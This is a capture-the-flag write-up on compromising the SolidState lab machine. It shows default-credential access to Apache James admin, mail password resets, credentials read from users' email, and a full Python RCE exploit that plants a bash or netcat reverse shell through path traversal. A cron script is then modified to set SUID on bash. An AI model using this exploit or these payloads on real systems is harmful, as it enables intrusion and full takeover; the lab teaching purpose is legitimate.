# Information

- Name: Solid State
- Date Release: 12 Sep 2018
- Author: Ch33z\_plz
- Series: Solid State
- Platform: Vulnhub and Hack The Box
- Link: https://www.vulnhub.com/entry/solidstate-1,261/
- Difficulty: Medium

# Write Up
## Enumeration
### Host Discovery
Host Discovery is performed using [arpScan](https://github.com/aalmeidar/Tools) with fast mode. In this lab, the machine ip is _10.0.2.15_.
```Console
# python arpScan.py -r 10.0.2.0/24 -m 2
[*] 52:54:00:12:35:00 10.0.2.1
[*] 52:54:00:12:35:00 10.0.2.2
[*] 08:00:27:1c:8d:cc 10.0.2.3
[*] 08:00:27:1b:72:16 10.0.2.15
```
### Port Scanning
Port Scanning is realized with [portScan](https://github.com/aalmeidar/Tools) and _nmap_. First and foremost, let's discover open ports:
```Console
# python portScanner.py -i 10.0.2.15
[┤] Scanning Ports: 65535
[*] Port 80 (http) open
[*] Port 25 (smtp) open
[*] Port 22 (ssh) open
[*] Port 110 (pop3) open
[*] Port 119 (nntp) open
[*] Port 4555 (unknown) open
```
The following is enumerate the service versions running wit _nmap_:
```Console
# nmap -sV -p80,25,22,110,119,4555 10.0.2.15
Nmap scan report for 10.0.2.15 (10.0.2.15)
Host is up (0.00032s latency).

PORT     STATE  SERVICE     VERSION
22/tcp   open   ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
25/tcp   open   smtp        JAMES smtpd 2.3.2
80/tcp   closed http
110/tcp  open   pop3        JAMES pop3d 2.3.2
119/tcp  open   nntp        JAMES nntpd (posting ok)
4555/tcp open   james-admin JAMES Remote Admin 2.3.2
MAC Address: 08:00:27:1B:72:16 (Oracle VirtualBox virtual NIC)
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Sep  5 13:17:49 2022 -- 1 IP address (1 host up) scanned in 11.44 seconds
```

So, we have a JAMES server, that is a server that provides SMTP, POP3 and NNTP.

### Web
In the _index.html_ you can't see anything relevant. Let's fuzz the web to discover hidden directories and files. In this case, _gobuster_ report nothing important

![index](images/index.png)

```Console
/services.html        (Status: 200) [Size: 8404]
/assets               (Status: 301) [Size: 307] [--> http://10.0.2.15/assets/]
/images               (Status: 301) [Size: 307] [--> http://10.0.2.15/images/]
/index.html           (Status: 200) [Size: 7776]
/about.html           (Status: 200) [Size: 7182]
/README.txt           (Status: 200) [Size: 963]
/LICENSE.txt          (Status: 200) [Size: 17128]
/server-status        (Status: 403) [Size: 297]
```

### JAMES
Let's try default credentials root:root on the james-admin service:

```Console
telnet 10.0.2.15 4555
Trying 10.0.2.15...
Connected to 10.0.2.15.
Escape character is '^]'.
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
HELP
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```
So you can change the password of each user, for example, to _test_: 
```Console
setpassword james test
Password for james reset
setpassword thomas test
Password for thomas reset
setpassword john test
Password for john reset
setpassword mindy test
Password for mindy reset
setpassword mailadmin test
Password for mailadmin reset
```

Now let's see if they have mails:

- John:
```Console
telnet 10.0.2.15 110
Trying 10.0.2.15...
Connected to 10.0.2.15.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER john
+OK
PASS test
+OK Welcome john
LIST
+OK 1 743
1 743
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James

.
```

- Mindy:
```Console
telnet 10.0.2.15 110
Trying 10.0.2.15...
Connected to 10.0.2.15.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mindy
+OK
PASS test
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
.
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

.
```

So, we have access to ssh via mindy but looks like is a restricted bash.

## Exploitation
In addition, JAMES 2.3.2 is vulnerable to RCE. So let's start a shell in port 433.

The following script is going to create a user and inject a shell:

```Python
# Exploit Title: Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2)
# Date: 27/09/2021
# Exploit Author: shinris3n
# Vendor Homepage: http://james.apache.org/server/
# Software Link: http://ftp.ps.pl/pub/apache/james/server/apache-james-2.3.2.zip
# Version: Apache James Server 2.3.2
# Tested on: Ubuntu
# Info: This exploit works on default installation of Apache James Server 2.3.2
# Info: Example paths that will automatically execute payload on some action: /etc/bash_completion.d , /etc/pm/config.d

'''
This Python 3 implementation is based on the original (Python 2) exploit code developed by
Jakub Palaczynski, Marcin Woloszyn, Maciej Grabiec.  The following modifications were made:

1 - Made required changes to print and socket commands for Python 3 compatibility.
1 - Changed the default payload to a basic bash reverse shell script and added a netcat option.
2 - Changed the command line syntax to allow user input of remote ip, local ip and listener port to correspond with #2.
3 - Added a payload that can be used for testing remote command execution and connectivity.
4 - Added payload and listener information output based on payload selection and user input.
5 - Added execution output clarifications and additional informational comments throughout the code.

@shinris3n
https://twitter.com/shinris3n
https://shinris3n.github.io/
'''

#!/usr/bin/python3

import socket
import sys
import time

# credentials to James Remote Administration Tool (Default - root/root)
user = 'root'
pwd = 'root'

if len(sys.argv) != 4:
    sys.stderr.write("[-]Usage: python3 %s <remote ip> <local ip> <local listener port>\n" % sys.argv[0])
    sys.stderr.write("[-]Example: python3 %s 172.16.1.66 172.16.1.139 443\n" % sys.argv[0])
    sys.stderr.write("[-]Note: The default payload is a basic bash reverse shell - check script for details and other options.\n")
    sys.exit(1)

remote_ip = sys.argv[1]
local_ip = sys.argv[2]
port = sys.argv[3]

# Select payload prior to running script - default is a reverse shell executed upon any user logging in (i.e. via SSH)
payload = '/bin/bash -i >& /dev/tcp/' + local_ip + '/' + port + ' 0>&1' # basic bash reverse shell exploit executes after user login
#payload = 'nc -e /bin/sh ' + local_ip + ' ' + port # basic netcat reverse shell
#payload = 'echo $USER && cat /etc/passwd && ping -c 4 ' + local_ip # test remote command execution capabilities and connectivity
#payload = '[ "$(id -u)" == "0" ] && touch /root/proof.txt' # proof of concept exploit on root user login only

print ("[+]Payload Selected (see script for more options): ", payload)
if '/bin/bash' in payload:
    print ("[+]Example netcat listener syntax to use after successful execution: nc -lvnp", port)


def recv(s):
        s.recv(1024)
        time.sleep(0.2)

try:
    print ("[+]Connecting to James Remote Administration Tool...")
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((remote_ip,4555)) # Assumes James Remote Administration Tool is running on Port 4555, change if necessary.
    s.recv(1024)
    s.send((user + "\n").encode('utf-8'))
    s.recv(1024)
    s.send((pwd + "\n").encode('utf-8'))
    s.recv(1024)
    print ("[+]Creating user...")
    s.send("adduser ../../../../../../../../etc/bash_completion.d exploit\n".encode('utf-8'))
    s.recv(1024)
    s.send("quit\n".encode('utf-8'))
    s.close()

    print ("[+]Connecting to James SMTP server...")
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((remote_ip,25)) # Assumes default SMTP port, change if necessary.
    s.send("ehlo team@team.pl\r\n".encode('utf-8'))
    recv(s)
    print ("[+]Sending payload...")
    s.send("mail from: <'@team.pl>\r\n".encode('utf-8'))
    recv(s)
    # also try s.send("rcpt to: <../../../../../../../../etc/bash_completion.d@hostname>\r\n".encode('utf-8')) if the recipient cannot be found
    s.send("rcpt to: <../../../../../../../../etc/bash_completion.d>\r\n".encode('utf-8'))
    recv(s)
    s.send("data\r\n".encode('utf-8'))
    recv(s)
    s.send("From: team@team.pl\r\n".encode('utf-8'))
    s.send("\r\n".encode('utf-8'))
    s.send("'\n".encode('utf-8'))
    s.send((payload + "\n").encode('utf-8'))
    s.send("\r\n.\r\n".encode('utf-8'))
    recv(s)
    s.send("quit\r\n".encode('utf-8'))
    recv(s)
    s.close()
    print ("[+]Done! Payload will be executed once somebody logs in (i.e. via SSH).")
    if '/bin/bash' in payload:
        print ("[+]Don't forget to start a listener on port", port, "before logging in!")
except:
    print ("Connection failed.")
```
When a user login in ssh, we will have a shell.

Connect to ssh:

```Console
# ssh mindy@10.0.2.15                    
mindy@10.0.2.15's password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686
...
...
...
...
: No such file or directory
```
Netcat Session:
```Console
nc -lvnp 433
listening on [any] 433 ...
connect to [10.0.2.19] from (UNKNOWN) [10.0.2.15] 39576
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cat user.txt
914d0a4ebc1777889b5b89a23f556fd75

```
So, we have escape from restricted shell. Another way, is append _bash_ to ssh command.

## Privilege Escalation

In /opt there is a script for remove tmp files. I suspect that it is executed by root through crontab. So, if we add to the script that assigns the suid permission to the bash we can be root.

```Console
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cat /opt/tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()

${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1265272 May 15  2017 /bin/bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ echo "os.system('chmod 4777 /bin/bash')" >> /opt/tmp.py
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cat /opt/tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()

os.system('chmod 4777 /bin/bash')

${debian_chroot:+(rwx 1 root root 1265272 May 15  2017 /bin/bash
-rwsrwxrwx 1 root root 1265272 May 15  2017 /bin/bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ bash -p
whoami
root
id
uid=1001(mindy) gid=1001(mindy) euid=0(root) groups=1001(mindy)
cat /root/root.txt
b4c9723a28899b1c45db281d99cc87c9

```


